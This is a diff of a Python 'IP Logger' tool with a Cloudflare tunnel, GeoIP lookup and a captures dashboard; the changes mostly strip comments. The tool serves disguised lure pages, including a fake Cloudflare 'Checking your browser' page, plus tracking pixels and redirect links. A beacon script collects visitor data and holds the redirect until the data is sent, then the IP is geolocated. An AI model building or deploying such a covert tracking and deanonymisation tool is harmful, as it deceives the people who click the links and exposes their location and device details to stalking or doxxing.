@@ -1,20 +1,18 @@
-#!/usr/bin/env python3
 """IP Logger — Cloudflare Tunnel + Dashboard + GeoIP"""
 
 import base64, hashlib, http.server, json, os, re, secrets, subprocess, sys
 import threading, time, urllib.parse, urllib.request
 from datetime import datetime, timezone
 
-# ═══ Config ════════════════════════════════════════════════
 CONFIG = {
     "log_file":    "ip_log.json",
     "port":        8080,
-    "mode":        "lure",    # "lure" | "redirect"
+    "mode":        "lure",    
     "lure":        "captcha",
     "redirect":    "https://www.youtube.com",
-    "secret":      "",        # Basic Auth password (vide = public)
+    "secret":      "",        
     "track_token": "",
-    "lang":        "en",      # en | fr | ru | es | de | zh
+    "lang":        "en",      
     "public_url":  "",
 }
 
@@ -47,7 +45,6 @@ PIXEL_GIF = bytes.fromhex(
     "00000000010001000002024401003b"
 )
 
-# ═══ i18n ═════════════════════════════════════════════════
 
 LANGS = {
     "en": {
@@ -139,9 +136,6 @@ LANGS = {
 def T(key):
     return LANGS.get(CONFIG["lang"], LANGS["en"]).get(key, LANGS["en"].get(key, key))
 
-# ═══ Beacon JS ════════════════════════════════════════════
-# Beacon envoie les données ET attend avant le redirect
-# pour que les stats soient bien reçues côté serveur.
 BEACON_JS = """<script>
 (function(){
   var _sent=false;
@@ -200,7 +194,6 @@ BEACON_JS = """<script>
 })();
 </script>"""
 
-# ═══ Lure pages ═══════════════════════════════════════════
 
 def _lure_captcha():
     return """<!DOCTYPE html><html><head><meta charset=UTF-8>
@@ -439,7 +432,6 @@ LURES = {
     "blank":   _lure_blank,
 }
 
-# ═══ Dashboard HTML (style kerbes.org) ════════════════════
 
 DASHBOARD = r"""<!DOCTYPE html>
 <html lang="fr">
@@ -755,7 +747,6 @@ function escHtml(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(
 </script>
 </body></html>"""
 
-# ═══ UA Parser ════════════════════════════════════════════
 
 def parse_ua(ua):
     browser = "Unknown"
@@ -798,7 +789,6 @@ def parse_ua(ua):
     mobile = bool(re.search(r"Mobile|Android|iPhone|iPad", ua))
     return browser, os_name, "Mobile" if mobile else "Desktop"
 
-# ═══ GeoIP (ip-api primary, ipinfo fallback) ══════════════
 
 def enrich_ip(ip, entry):
     if LOCAL_RE.match(ip):
@@ -835,7 +825,6 @@ def _geoip_ipapi(ip):
 
 
 def _geoip_freeipapi(ip):
-    # freeipapi.com — gratuit, pas de clé, ~60 req/min
     try:
         d = _req(f"https://freeipapi.com/api/json/{ip}")
         if not d.get("cityName"): return None
@@ -897,7 +886,6 @@ def handle_beacon(ip, data):
     except Exception:
         pass
 
-# ═══ Core logging ═════════════════════════════════════════
 
 def get_real_ip(handler):
     for h in ("CF-Connecting-IP", "X-Forwarded-For", "X-Real-IP", "True-Client-IP"):
@@ -951,7 +939,6 @@ def log_entry(ip, handler):
     threading.Thread(target=enrich_ip, args=(ip, entry), daemon=True).start()
     return entry
 
-# ═══ HTTP Handler ══════════════════════════════════════════
 
 class Handler(http.server.BaseHTTPRequestHandler):
     def log_message(self, *a): pass
@@ -964,7 +951,6 @@ class Handler(http.server.BaseHTTPRequestHandler):
             ip    = get_real_ip(self)
             token = CONFIG["track_token"]
 
-            # ── Dashboard (Basic Auth) ─────────────────
             if path in ("/logs", "/logs/json", "/dashboard"):
                 if CONFIG["secret"] and not self._check_auth():
                     self.send_response(401)
@@ -973,12 +959,10 @@ class Handler(http.server.BaseHTTPRequestHandler):
                     self.end_headers(); return
                 self._serve_dashboard(raw_json=(path == "/logs/json")); return
 
-            # ── Pixel ──────────────────────────────────
             if path in ("/pixel", f"/pixel/{token}"):
                 log_entry(ip, self)
                 self._gif(); return
 
-            # ── Redirect 302 direct (mode redirect) ────
             if path in ("/r", f"/r/{token}"):
                 log_entry(ip, self)
                 target = qs.get("to", CONFIG["redirect"])
@@ -986,11 +970,9 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 self.send_header("Location", target)
                 self.end_headers(); return
 
-            # ── Track URL principale ───────────────────
             if path in (f"/t/{token}", f"/v/{token}", f"/s/{token}", f"/go/{token}", "/"):
                 log_entry(ip, self)
                 if CONFIG["mode"] == "redirect":
-                    # 302 immédiat + pixel en fond via img tag
                     page = (
                         f'<!DOCTYPE html><html><head><meta charset=UTF-8>'
                         f'<meta http-equiv="refresh" content="0;url={CONFIG["redirect"]}">'
@@ -1038,8 +1020,6 @@ class Handler(http.server.BaseHTTPRequestHandler):
             self.send_header("Content-Type","text/html")
             self.end_headers()
         except Exception: pass
-
-    # ── Helpers ──────────────────────────────────────────
     def _qs(self):
         if "?" not in self.path: return {}
         return {k: urllib.parse.unquote_plus(v)
@@ -1075,7 +1055,6 @@ class Handler(http.server.BaseHTTPRequestHandler):
         ray = "".join(random.choices(string.ascii_lowercase+string.digits, k=16))
         ts  = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
         redir = CONFIG["redirect"]
-        # Script qui déclenche le redirect APRÈS que le beacon ait envoyé ses données
         redir_script = (
             f'<script>'
             f'window._doRedirect=function(){{window.location.replace("{redir}")}};'
@@ -1162,7 +1141,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
             tz_s = tz.split("/")[-1] if "/" in tz else tz
             lang = e.get("lang","")
 
-            idx = len(rev) - i  # index dans rev pour le modal (rev[idx] = e)
+            idx = len(rev) - i  
             rows += (
                 f'<tr onclick="openModal({idx})">'
                 f'<td class="c-n">{i}</td>'
@@ -1197,7 +1176,6 @@ class Handler(http.server.BaseHTTPRequestHandler):
         entries_json_str = json.dumps(rev, ensure_ascii=False)
         now  = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
 
-        # Dashboard i18n strings (per-language)
         D = {
             "en": {
                 "tab_captures":"Captures","tab_stats":"Stats","tab_config":"Config",
@@ -1379,7 +1357,6 @@ class Handler(http.server.BaseHTTPRequestHandler):
 class QuietServer(http.server.HTTPServer):
     def handle_error(self, request, client_address): pass
 
-# ═══ Cloudflare Tunnel ════════════════════════════════════
 
 def start_cloudflared(port):
     url_event   = threading.Event()
@@ -1419,7 +1396,6 @@ def start_cloudflared(port):
 
     return proc, public_url[0]
 
-# ═══ TUI ══════════════════════════════════════════════════
 
 try:
     import colorama; colorama.init()
@@ -1433,7 +1409,6 @@ G   = _c("92");  Y   = _c("93");  C   = _c("96")
 DIM = _c("2");   B   = _c("1");   RST = _c("0")
 UL  = _c("4")   # underline
 
-# ═══ Auto-install cloudflared ═════════════════════════════
 
 def _cloudflared_available():
     try:
@@ -1449,7 +1424,6 @@ def _install_cloudflared():
     print(f"\n  {Y}cloudflared non trouvé — installation automatique...{RST}\n")
 
     if plat == "win32":
-        # Terminer le processus si winget dispo, sinon curl direct
         try:
             r = subprocess.run(
                 ["winget","install","Cloudflare.cloudflared","--source","winget","--silent","--accept-package-agreements","--accept-source-agreements"],
@@ -1460,7 +1434,6 @@ def _install_cloudflared():
                 return True
         except Exception:
             pass
-        # Fallback : télécharge l'exe à côté du script
         exe = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cloudflared.exe")
         try:
             print(f"  {DIM}Téléchargement cloudflared.exe...{RST}", end="", flush=True)
@@ -1469,7 +1442,6 @@ def _install_cloudflared():
                 exe
             )
             print(f" {G}OK{RST}")
-            # Ajoute le dossier au PATH pour cette session
             os.environ["PATH"] = os.path.dirname(exe) + os.pathsep + os.environ.get("PATH","")
             return True
         except Exception as e:
@@ -1477,7 +1449,6 @@ def _install_cloudflared():
             return False
 
     elif plat == "darwin":
-        # macOS — Homebrew
         try:
             subprocess.run(["brew","install","cloudflared"], timeout=120, check=True)
             print(f"  {G}✓ cloudflared installé via brew{RST}")
@@ -1486,11 +1457,9 @@ def _install_cloudflared():
             print(f"  {R}Échec brew : {e}{RST}"); return False
 
     else:
-        # Linux / Termux
         arch_map = {"x86_64":"amd64","aarch64":"arm64","armv7l":"arm","i686":"386"}
         arch = arch_map.get(machine, "amd64")
 
-        # Termux : pas de sudo
         is_termux = "com.termux" in os.environ.get("PREFIX","") or os.path.exists("/data/data/com.termux")
         dest = "/data/data/com.termux/files/usr/bin/cloudflared" if is_termux else "/usr/local/bin/cloudflared"
         url  = f"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-{arch}"
@@ -1509,7 +1478,6 @@ def _install_cloudflared():
         except Exception as e:
             print(f"\n  {R}Échec : {e}{RST}"); return False
 
-# ═══ TUI ══════════════════════════════════════════════════
 
 LURE_LABELS = {
     "captcha": "Cloudflare — Checking your browser",
@@ -1524,7 +1492,6 @@ LURE_LABELS = {
     "blank":   "Blank page (SSRF/API)",
 }
 
-# ── ASCII logo (2 lignes séparées, couleurs kerbes) ────────
 _LOGO_IP = (
     "  _____  ___   \n"
     "  \\_   \\/ _ \\  \n"
@@ -1544,7 +1511,6 @@ _LOGO_LG = (
 def _logo():
     ip_lines = _LOGO_IP.splitlines()
     lg_lines = _LOGO_LG.splitlines()
-    # Pad gauche pour aligner les deux blocs côte à côte
     w = max(len(l) for l in ip_lines) + 2
     combined = []
     for i in range(max(len(ip_lines), len(lg_lines))):
@@ -1760,7 +1726,6 @@ def _do_tunnel():
             return None, None
     return start_cloudflared(CONFIG["port"])
 
-# ═══ Main ══════════════════════════════════════════════════
 
 def run():
     load_config()
@@ -1768,7 +1733,6 @@ def run():
     server  = [None]
     cf_proc = [None]
 
-    # ── Start server ───────────────────────────────────────
     clr(); banner()
     print(f"\n  {DIM}{T('server_start')}{RST}")
     srv = launch_server()
@@ -1777,7 +1741,6 @@ def run():
     server[0] = srv
     print(f"  {G}✓{RST}  port {CONFIG['port']}")
 
-    # ── Tunnel auto ────────────────────────────────────────
     print(f"  {DIM}{T('connecting')}{RST}")
     proc, url = _do_tunnel()
     if proc:
@@ -1790,7 +1753,6 @@ def run():
         print(f"  {Y}⚠{RST}  no tunnel (local only)")
     time.sleep(0.7)
 
-    # ── Main menu loop ─────────────────────────────────────
     while True:
         clr(); banner()
         tunnel_active = cf_proc[0] is not None and cf_proc[0].poll() is None
